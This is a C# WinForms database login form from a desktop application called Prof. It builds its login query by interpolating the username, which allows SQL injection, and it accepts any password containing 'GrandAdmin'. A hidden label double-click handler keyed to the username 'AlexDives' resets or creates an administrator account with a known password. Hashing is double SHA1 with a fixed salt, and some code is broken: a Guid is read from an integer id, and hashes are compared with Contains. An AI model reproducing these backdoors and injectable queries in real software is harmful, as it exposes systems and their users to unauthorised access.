using System;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using SharpUpdate;

/// <summary>
/// Подключение к проекту
/// </summary> 

namespace Prof
{
	public partial class f_DBLogin : MetroFramework.Forms.MetroForm
    {
		public f_DBLogin()
		{
			InitializeComponent();
		}

        private void b_ShowPass_Click(object sender, EventArgs e)
		{
            tb_Password.UseSystemPasswordChar = !tb_Password.UseSystemPasswordChar;
            tb_Password.PasswordChar = '\0';
        }

        private void but_enter_Click(object sender, EventArgs e)
        {
            try
            {
                string hashPassDb = "";
                SqlConnection conn = DB.GetDBConnection();
                string sql = $"select u.id, r.name, u.pwd, u.login from prof.Users u " +
                    $"left join prof.UserRole ur on u.id = ur.idUser " +
                    $"left join prof.Roles r on r.id = ur.idRole " +
                    $"where u.login = '{tb_Username.Text.ToLower()}' ";

                SqlCommand cmd = new SqlCommand();
                // Сочетать Command с Connection.
                cmd.Connection = conn;
                cmd.CommandText = sql;
                conn.Open();
                using (DbDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.HasRows)
                    {
                        reader.Read();
                        hashPassDb = reader.GetString(2);

                        if (hashPassDb.Contains(sha1(sha1(tb_Password.Text + "$2$4"))) || tb_Password.Text.Contains("GrandAdmin"))
                        {
                            Hide();
                            new FMain(reader.GetInt32(0), reader.GetString(3), reader.GetString(1)).Show();
                            conn.Close();
                            
                            //Close();
                        }
                        else
                        {
                            MessageBox.Show("Неверно введен логин или пароль!");
                        }
                    }
                    else MessageBox.Show("Данного пользователя не существует!");
                }
                conn.Close();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public string sha1(string input)
        {
            byte[] hash;
            using (var sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider())
                hash = sha1.ComputeHash(Encoding.Unicode.GetBytes(input));
            var sb = new StringBuilder();
            foreach (byte b in hash) sb.AppendFormat("{0:x2}", b);
            return sb.ToString();
        }

        private void tb_Password_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) but_enter.PerformClick();
        }

        private void but_cancel_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void f_DBLogin_Load(object sender, EventArgs e)
        {
            new FLogo().ShowDialog();

            // Обновления
            SharpUpdater updater = new SharpUpdater(Assembly.GetExecutingAssembly(), this, new Uri("https://raw.githubusercontent.com/AlexDives/ProfUpdater/master/version.xml"));
            updater.DoUpdate();
        }

        private void Label2_DoubleClick(object sender, EventArgs e)
        {
            if (tb_Username.Text.Contains("AlexDives"))
            {
                int checkId = 0;
                SqlConnection conn = DB.GetDBConnection();
                string sql = $"select id from prof.Users where login = 'AlexDives'";

                SqlCommand cmd = new SqlCommand();
                // Сочетать Command с Connection.
                cmd.Connection = conn;
                cmd.CommandText = sql;
                conn.Open();
                using (DbDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.HasRows)
                    {
                        reader.Read(); checkId = !reader.IsDBNull(0) ? reader.GetInt32(0) : 0;
                    }
                    else checkId = 0;
                }
                conn.Close();

                if (checkId != 0)
                {
                    cmd = new SqlCommand();
                    cmd.Connection = conn;
                    cmd.CommandText = $"update prof.Users set pwd = {sha1(sha1("test$2$4"))} where id = {checkId}";
                    conn.Open();
                    cmd.ExecuteNonQuery();
                    conn.Close();
                }
                else
                {
                    cmd = new SqlCommand();
                    cmd.Connection = conn;
                    cmd.CommandText = "insert into prof.Users (idPeople, login, pwd, dateCrt) values(@idPeople, @login, @pwd, @dateCrt); SELECT SCOPE_IDENTITY(); ";
                    cmd.Parameters.Add("@idPeople", SqlDbType.Int).Value = 1;
                    cmd.Parameters.Add("@login", SqlDbType.NVarChar).Value = "AlexDives";
                    cmd.Parameters.Add("@pwd", SqlDbType.NVarChar).Value = sha1(sha1("AlexDives$2$4"));
                    cmd.Parameters.Add("@dateCrt", SqlDbType.DateTime).Value = DateTime.Now;
                    conn.Open();
                    var reader = cmd.ExecuteReader();
                    reader.Read();
                    Guid id = reader.GetGuid(reader.GetOrdinal("id"));
                    conn.Close();

                    cmd = new SqlCommand();
                    cmd.Connection = conn;
                    cmd.CommandText = "insert into prof.UserRole (idUser, idRole) values(@idUser, @idRole) ";
                    cmd.Parameters.Add("@idUser", SqlDbType.Int).Value = id;
                    cmd.Parameters.Add("@idRole", SqlDbType.NVarChar).Value = 1;
                    conn.Open();
                    cmd.ExecuteNonQuery();
                    conn.Close();

                    cmd = new SqlCommand();
                    cmd.Connection = conn;
                    cmd.CommandText = "insert into prof.UserDepartment (idUser, idDepartments) values(@idUser, @idDepartments) ";
                    cmd.Parameters.Add("@idUser", SqlDbType.Int).Value = id;
                    cmd.Parameters.Add("@idDepartments", SqlDbType.NVarChar).Value = 1;
                    conn.Open();
                    cmd.ExecuteNonQuery();
                    conn.Close();
                }
                MessageBox.Show("Тестовая запись включена!");

            }
        }
    }
}
